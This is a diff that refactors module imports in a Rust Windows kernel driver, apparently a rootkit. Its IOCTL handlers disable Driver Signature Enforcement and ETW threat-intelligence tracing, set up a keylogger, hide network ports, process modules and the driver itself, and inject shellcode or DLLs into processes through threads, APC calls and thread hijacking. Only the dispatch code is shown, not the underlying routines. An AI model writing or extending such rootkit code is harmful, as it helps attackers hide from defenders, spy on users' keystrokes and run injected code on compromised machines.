@@ -22,22 +22,21 @@ use shadow_core::callback::{
     notify_routine,
     registry
 };
-use shadow_core::{Dse, Etw, Module};
-use shadow_core::{Process, Thread, Network};
 use shadow_core::{
     network, 
-    Driver, 
-    Keylogger,
-    Shellcode,
-    DLL
+    module, 
+    misc, 
+    driver,
+    injection
 };
+use shadow_core::{Process, Thread};
 use shadow_core::{
     PROCESS_INFO_HIDE, 
     THREAD_INFO_HIDE
 };
 
 #[cfg(not(feature = "mapper"))]
-use crate::callback::{driver, process, thread};
+use crate::callback::{self, process, thread};
 use crate::util::{
     get_input_buffer, 
     get_output_buffer
@@ -248,7 +247,7 @@ impl IoctlManager {
                 let target_dse = get_input_buffer::<DSE>(stack)?;
 
                 // Call to enable or disable DSE based on the input
-                let status = Dse::set_dse_state((*target_dse).enable)?;
+                let status = misc::set_dse_state((*target_dse).enable)?;
 
                 // Set the number of bytes returned to the size of the ETWTI structure
                 (*irp).IoStatus.Information = size_of::<ETWTI>() as u64;
@@ -261,7 +260,7 @@ impl IoctlManager {
             unsafe {
                 // If the USER_ADDRESS has not been set, retrieve it using the keylogger function
                 if USER_ADDRESS == 0 {
-                    USER_ADDRESS = match Keylogger::get_user_address_keylogger() {
+                    USER_ADDRESS = match misc::get_user_address_keylogger() {
                         Ok(addr) => addr as usize,
                         Err(err) => {
                             // Log the error and return a failure status if keylogger setup fails
@@ -293,7 +292,7 @@ impl IoctlManager {
                 let target_etw = get_input_buffer::<ETWTI>(stack)?;
 
                 // Call to enable or disable ETW tracing based on the input
-                let status = Etw::etwti_enable_disable((*target_etw).enable)?;
+                let status = misc::etwti_enable_disable((*target_etw).enable)?;
 
                 // Set the number of bytes returned to the size of the ETWTI structure
                 (*irp).IoStatus.Information = size_of::<ETWTI>() as u64;         
@@ -312,7 +311,7 @@ impl IoctlManager {
                 
                 // If the list is empty and the hook is not installed, install the hook
                 if protected_ports.is_empty() && !network::HOOK_INSTALLED.load(Ordering::Relaxed) {
-                    Network::install_hook()?;
+                    network::install_hook()?;
                 }
 
                 // Unlock the ports list
@@ -330,7 +329,7 @@ impl IoctlManager {
                 
                 // If the operation was successful and the list is now empty, uninstall the hook
                 if NT_SUCCESS(status) && network::PROTECTED_PORTS.lock().is_empty() && network::HOOK_INSTALLED.load(Ordering::Relaxed) {
-                    Network::uninstall_hook()?;
+                    network::uninstall_hook()?;
                 }
 
                 // Set the number of bytes
@@ -351,7 +350,7 @@ impl IoctlManager {
                 let pid = (*target_process).pid;
 
                 // Enumerate modules in the process
-                let modules = Module::enumerate_module(pid)?;
+                let modules = module::enumerate_module(pid)?;
 
                 // Ensure we do not exceed buffer limits
                 let entries_to_copy = core::cmp::min(modules.len(), max_entries);
@@ -382,7 +381,7 @@ impl IoctlManager {
                 let target = get_input_buffer::<TargetModule>(stack)?;
                 
                 // Hide the module based on the PID and module name
-                let status = Module::hide_module((*target).pid, &(*target).module_name.to_lowercase())?;
+                let status = module::hide_module((*target).pid, &(*target).module_name.to_lowercase())?;
 
                 // Update IoStatus to indicate success
                 (*irp).IoStatus.Information = size_of::<TargetModule>() as u64;
@@ -405,7 +404,7 @@ impl IoctlManager {
                 (*irp).IoStatus.Information = size_of::<TargetInjection>() as u64;
 
                 // Perform shellcode injection using a new thread
-                Shellcode::thread(pid, path)
+                injection::shellcode::thread(pid, path)
             }
         }));
 
@@ -421,7 +420,7 @@ impl IoctlManager {
                 (*irp).IoStatus.Information = size_of::<TargetInjection>() as u64;
 
                 // Perform shellcode injection via APC.
-                Shellcode::apc(pid, path)
+                injection::shellcode::apc(pid, path)
             }
         }));
 
@@ -437,7 +436,7 @@ impl IoctlManager {
                 (*irp).IoStatus.Information = size_of::<TargetInjection>() as u64;
 
                 // Perform DLL injection using a new thread
-                DLL::thread(pid, path)
+                injection::dll::thread(pid, path)
             }
         }));
 
@@ -453,11 +452,11 @@ impl IoctlManager {
                 (*irp).IoStatus.Information = size_of::<TargetInjection>() as u64;
 
                 // Perform DLL injection using APC
-                DLL::apc(pid, path)
+                injection::dll::apc(pid, path)
             }
         }));
 
-        //  Execute Shellcode with Thread Hijacking.
+        // Execute Shellcode with Thread Hijacking.
         self.register_handler(INJECTION_SHELLCODE_THREAD_HIJACKING, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION| {
             unsafe {
                 // Get the input buffer with the injection data
@@ -469,7 +468,7 @@ impl IoctlManager {
                 (*irp).IoStatus.Information = size_of::<TargetInjection>() as u64;
 
                 // Perform Thread Hijacking
-                Shellcode::thread_hijacking(pid, path)
+                injection::shellcode::thread_hijacking(pid, path)
             }
         }));
     }
@@ -485,7 +484,7 @@ impl IoctlManager {
                 // Perform the operation based on whether we are hiding or unhiding the driver
                 let status = if (*target_driver).enable {
                     // Hide the driver and store its previous entries
-                    let (previous_list, previos_ldr_data) = Driver::hide_driver(driver_name)?;
+                    let (previous_list, previos_ldr_data) = driver::hide_driver(driver_name)?;
                     let mut driver_info = DRIVER_INFO_HIDE.lock();
 
                     // Store the previous list entry and LDR_DATA_TABLE_ENTRY for later restoration
@@ -511,7 +510,7 @@ impl IoctlManager {
                         ))
                         .ok_or(ShadowError::DriverNotFound(driver_name.to_string()))?;
 
-                    Driver::unhide_driver(driver_name, list_entry.cast(), ldr_data.cast())?
+                    driver::unhide_driver(driver_name, list_entry.cast(), ldr_data.cast())?
                 };
                 
                 // Set the size of the returned information
@@ -527,7 +526,7 @@ impl IoctlManager {
                 let (driver_info, max_entries) = get_output_buffer::<DriverInfo>(irp, stack)?;
 
                 // Enumerate the drivers currently loaded in the system
-                let drivers = Driver::enumerate_driver()?;
+                let drivers = driver::enumerate_driver()?;
 
                 // Copy only what fits in the user buffer
                 let entries_to_copy = core::cmp::min(drivers.len(), max_entries);
@@ -547,9 +546,9 @@ impl IoctlManager {
                     let driver_name = &(*target_driver).name;
     
                     let status = if (*target_driver).enable {
-                        driver::add_driver(driver_name.to_string())
+                        callback::driver::add_driver(driver_name.to_string())
                     } else {
-                        driver::remove_driver(driver_name)
+                        callback::driver::remove_driver(driver_name)
                     };
     
                     // Set the size of the returned information
